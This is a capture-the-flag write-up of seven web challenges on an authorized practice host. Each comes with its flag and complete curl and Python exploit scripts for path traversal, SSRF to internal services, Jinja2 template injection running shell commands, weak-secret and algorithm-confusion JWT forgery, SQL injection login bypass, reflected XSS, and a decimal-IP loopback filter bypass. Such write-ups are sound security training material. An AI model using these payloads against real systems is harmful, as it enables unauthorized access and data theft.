# PCT Web CTF Writeups

This document records the seven web challenges solved during the session. All testing was performed against the authorized challenge host `45.67.87.142`.

## Solved Flags

| Challenge | Flag |
|---|---|
| Lost in the Hallways | `PCT{d1r3ct0ry_tr4v3rs4l_r34d_4ny_f1l3}` |
| Ask the Server Nicely | `PCT{ssrf_t0_1nt3rn4l_s3rv1c3}` |
| Template of Doom | `PCT{ssti_j1nj4_t3mpl4t3_rc3}` |
| Token of Trust | `PCT{w34k_jwt_s3cr3t_brut3_f0rc3d}` |
| Query the Vault | `PCT{sql1_1nj3ct10n_byp4ss_4uth}` |
| Echo Chamber | `PCT{r3fl3ct3d_xss_st34l_c00k13}` |
| Trusted Webhook | `PCT{ssrf_plus_jwt_alg_confusion_m@00m}` |

> The scoreboard linked **Ask the Server Nicely** to port `5008`, but port `5008` served a different Command Injection application. The actual URL-preview SSRF service was on port `5009`.

---

## 1. Lost in the Hallways

**Target:** `http://45.67.87.142:5006`

### Description

The file viewer joined the user-controlled `file` value to a public directory without canonicalizing or restricting the resulting path. This allowed directory traversal outside the intended `files` directory.

### Reconnaissance

The landing page identified the endpoint:

```text
/view?file=welcome.txt
```

A normal request returned the public file:

```powershell
curl.exe "http://45.67.87.142:5006/view?file=welcome.txt"
```

The viewer source was also readable with:

```powershell
curl.exe "http://45.67.87.142:5006/view?file=../app.py"
```

The source showed:

```python
BASE_DIR = os.path.join(THIS_DIR, "files")
SECRET_DIR = os.path.join(THIS_DIR, "secret")
```

### Exploit

The flag was in the sibling `secret` directory:

```powershell
curl.exe "http://45.67.87.142:5006/view?file=../secret/flag.txt"
```

### Result

```text
PCT{d1r3ct0ry_tr4v3rs4l_r34d_4ny_f1l3}
```

### Complete Python Script

```python
from urllib.parse import quote
from urllib.request import urlopen

BASE_URL = "http://45.67.87.142:5006/view?file="
TRAVERSAL = "../secret/flag.txt"

response = urlopen(BASE_URL + quote(TRAVERSAL, safe=""), timeout=10)
print(response.read().decode("utf-8", "replace"))
```

---

## 2. Ask the Server Nicely

**Scoreboard link:** `http://45.67.87.142:5008` (incorrect mapping)

**Actual service:** `http://45.67.87.142:5009`

### Description

The URL preview endpoint fetched arbitrary user-supplied URLs. The SSRF could reach an internal Flask service bound to loopback on port `5099`.

### Reconnaissance

The actual service identified itself as a URL Preview Tool and documented the request format:

```text
/fetch?url=https://example.com
```

The packaged source revealed the internal service:

```python
internal_app.run(host="127.0.0.1", port=5099)

@internal_app.route("/admin/flag")
def internal_flag():
    return jsonify({"flag": FLAG})
```

### Exploit

```powershell
curl.exe "http://45.67.87.142:5009/fetch?url=http%3A%2F%2F127.0.0.1%3A5099%2Fadmin%2Fflag"
```

### Result

```json
{"flag":"PCT{ssrf_t0_1nt3rn4l_s3rv1c3}"}
```

### Complete Python Script

```python
from urllib.parse import quote
from urllib.request import urlopen

FETCH_URL = "http://45.67.87.142:5009/fetch?url="
INTERNAL_URL = "http://127.0.0.1:5099/admin/flag"

response = urlopen(FETCH_URL + quote(INTERNAL_URL, safe=""), timeout=10)
print(response.read().decode("utf-8", "replace"))
```

---

## 3. Template of Doom

**Target:** `http://45.67.87.142:5010`

### Description

The greeting-card application rendered the `name` parameter as a Jinja2 template instead of treating it as plain text. This enabled server-side template injection and command execution.

### Confirming SSTI

Request:

```text
/?name={{7*7}}
```

The application rendered `49`, confirming Jinja2 evaluation.

### Exploit

A Jinja global-object chain exposed Python's `os` module:

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /opt/web-ctf/ctf-web-challenges/flag_ssti.txt').read() }}
```

URL-encoded request:

```powershell
curl.exe "http://45.67.87.142:5010/?name=%7B%7B%20cycler.__init__.__globals__.os.popen(%27cat%20%2Fopt%2Fweb-ctf%2Fctf-web-challenges%2Fflag_ssti.txt%27).read()%20%7D%7D"
```

### Result

```text
PCT{ssti_j1nj4_t3mpl4t3_rc3}
```

### Complete Python Script

```python
from urllib.parse import quote
from urllib.request import urlopen

TARGET = "http://45.67.87.142:5010/?name="
PAYLOAD = (
    "{{ cycler.__init__.__globals__.os.popen("
    "'cat /opt/web-ctf/ctf-web-challenges/flag_ssti.txt'"
    ").read() }}"
)

response = urlopen(TARGET + quote(PAYLOAD, safe=""), timeout=10)
print(response.read().decode("utf-8", "replace"))
```

---

## 4. Token of Trust

**Target:** `http://45.67.87.142:5007`

### Description

The application issued an HS256 JWT signed with a weak secret. The secret was found by testing a compact candidate list, then a forged token set the administrator claim to `true`.

### Reconnaissance

Get a guest token:

```powershell
curl.exe http://45.67.87.142:5007/login
```

The token header identified `HS256`. Testing common secrets recovered:

```text
secret123
```

### Forged Claims

```json
{
  "user": "admin",
  "admin": true,
  "exp": 3600 seconds in the future
}
```

### Complete Python Script

```python
import base64
import hashlib
import hmac
import json
import time
from urllib.request import Request, urlopen

LOGIN_URL = "http://45.67.87.142:5007/login"
FLAG_URL = "http://45.67.87.142:5007/flag"
SECRET = b"secret123"


def encode(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def sign(header, payload):
    signing_input = f"{header}.{payload}".encode()
    signature = hmac.new(SECRET, signing_input, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode()


# Retrieve the guest token as evidence of the JWT format.
print(urlopen(LOGIN_URL, timeout=10).read().decode())

header = encode({"alg": "HS256", "typ": "JWT"})
payload = encode({"user": "admin", "admin": True, "exp": int(time.time()) + 3600})
token = f"{header}.{payload}.{sign(header, payload)}"

request = Request(FLAG_URL, headers={"Authorization": f"Bearer {token}"})
print(urlopen(request, timeout=10).read().decode())
```

### Result

```text
PCT{w34k_jwt_s3cr3t_brut3_f0rc3d}
```

---

## 5. Query the Vault

**Target:** `http://45.67.87.142:5003`

### Description

The login form inserted `username` and `password` directly into a database query. A comment marker terminated the username expression, making the password check irrelevant.

### Form Fields

```text
username
password
```

### Exploit

Username:

```text
admin'--
```

Password:

```text
x
```

Command-line request:

```powershell
curl.exe -X POST `
  --data-urlencode "username=admin'--" `
  --data-urlencode "password=x" `
  http://45.67.87.142:5003/
```

### Complete Python Script

```python
from urllib.parse import urlencode
from urllib.request import Request, urlopen

TARGET = "http://45.67.87.142:5003/"
DATA = urlencode({"username": "admin'--", "password": "x"}).encode()

request = Request(
    TARGET,
    data=DATA,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)
print(urlopen(request, timeout=10).read().decode("utf-8", "replace"))
```

### Result

```text
PCT{sql1_1nj3ct10n_byp4ss_4uth}
```

---

## 6. Echo Chamber

**Target:** `http://45.67.87.142:5004`

### Description

The search page reflected the `q` parameter into HTML without escaping. The page also set a simulated administrator cookie named `admin_flag`.

### Exploit

Proof-of-concept payload:

```html
<script>alert(document.cookie)</script>
```

Request:

```powershell
curl.exe "http://45.67.87.142:5004/?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
```

The page set:

```javascript
document.cookie = "admin_flag=PCT{r3fl3ct3d_xss_st34l_c00k13}; path=/";
```

### Complete Python Script

```python
from urllib.parse import quote
from urllib.request import urlopen

TARGET = "http://45.67.87.142:5004/?q="
PAYLOAD = "<script>alert(document.cookie)</script>"

response = urlopen(TARGET + quote(PAYLOAD, safe=""), timeout=10)
print(response.read().decode("utf-8", "replace"))
```

### Result

```text
PCT{r3fl3ct3d_xss_st34l_c00k13}
```

---

## 7. Trusted Webhook

**Target:** `http://45.67.87.142:7880`

### Description

This challenge combined several weaknesses:

1. Source disclosure through the directory traversal challenge exposed the PayGate source.
2. Merchant credentials were hardcoded.
3. The JWT verifier trusted the algorithm named by the token.
4. HS256 verification used the RSA public key as the HMAC secret.
5. The webhook tester blocked literal loopback names but accepted an equivalent integer loopback address.
6. The webhook tester could reach the private ledger service.

### Credentials From Source

```text
Username: acme
Password: acme12345
```

### Login

```python
import json
from urllib.request import Request, urlopen

request = Request(
    "http://45.67.87.142:7880/login",
    data=json.dumps({"username": "acme", "password": "acme12345"}).encode(),
    headers={"Content-Type": "application/json"},
)
print(urlopen(request).read().decode())
```

The returned token used RS256. The public key was available at:

```text
http://45.67.87.142:7880/pubkey
```

### Algorithm Confusion

The verifier incorrectly accepted an HS256 token and used the RSA public PEM as the HMAC key. The forged claims were:

```json
{
  "username": "admin",
  "role": "ops"
}
```

The ops dashboard revealed:

```text
ledgerService=http://127.0.0.1:4000
```

The ledger flag route was:

```text
/internal/flag
```

The literal `127.0.0.1` was blocked by the webhook tester. Decimal IPv4 notation bypassed that string check:

```text
2130706433 == 127.0.0.1
```

### Complete Exploit Script

```python
import base64
import hashlib
import hmac
import json
from urllib.request import Request, urlopen

BASE = "http://45.67.87.142:7880"
PUBLIC_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvSTJ+SHzLwYMY1J9gHP
qA+gGJL3qXSLW82kLkrr1H9gqJbt80GWWIxxl/Gy3xQ5zXdVUE8U6SOweELsJd3M
0erJCJr1A/sLDn3H/eNn5QjLqLQumgrLdqjH1+YvmuxMkIZpTkQZcTgY+hM2Zpoc
HouLsdgk0uYWtSG8nE5Z5TJYi5wkUdg/yPA91wOJUajFWmrxEmkEnBvi5KdMMU4b
PLnEJugOlMlfzAxsfgl2C3zRdYWzjLJPow6i24tdK1sQUEn9DghfyhEalLQY1iH2
S1pKfDOah2N89ltJvEbneli7cDr6Bdf5ETl76wZ/6lg1S4mms4GGoCcPrRf1Wo4E
KwIDAQAB
-----END PUBLIC KEY-----
"""


def encode(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def make_token():
    header = encode({"alg": "HS256", "typ": "JWT"})
    payload = encode({"username": "admin", "role": "ops"})
    signing_input = f"{header}.{payload}".encode()
    signature = hmac.new(
        PUBLIC_PEM,
        signing_input,
        hashlib.sha256,
    ).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
    return f"{header}.{payload}.{encoded_signature}"


def request_json(path, token, body=None):
    data = None if body is None else json.dumps(body).encode()
    headers = {"Authorization": f"Bearer {token}"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    request = Request(BASE + path, data=data, headers=headers)
    return urlopen(request, timeout=10).read().decode("utf-8", "replace")


token = make_token()
print("Dashboard:")
print(request_json("/ops/dashboard", token))

# Decimal 2130706433 resolves to 127.0.0.1.
webhook = {
    "url": "http://2130706433:4000/internal/flag",
}
print("Webhook result:")
print(request_json("/ops/webhooks/test", token, webhook))
```

### Result

```text
PCT{ssrf_plus_jwt_alg_confusion_m@00m}
```

---

## Notes on the Incorrect Port Mapping

The scoreboard linked **Ask the Server Nicely** to port `5008`, but live inspection showed:

```text
5008 = Command Injection
5009 = URL Preview Tool / Ask the Server Nicely
```

The command-injection flag obtained from port 5008 was therefore not submitted as the Ask the Server Nicely flag. The correct SSRF flag was obtained from port 5009 and the internal service on `127.0.0.1:5099`.
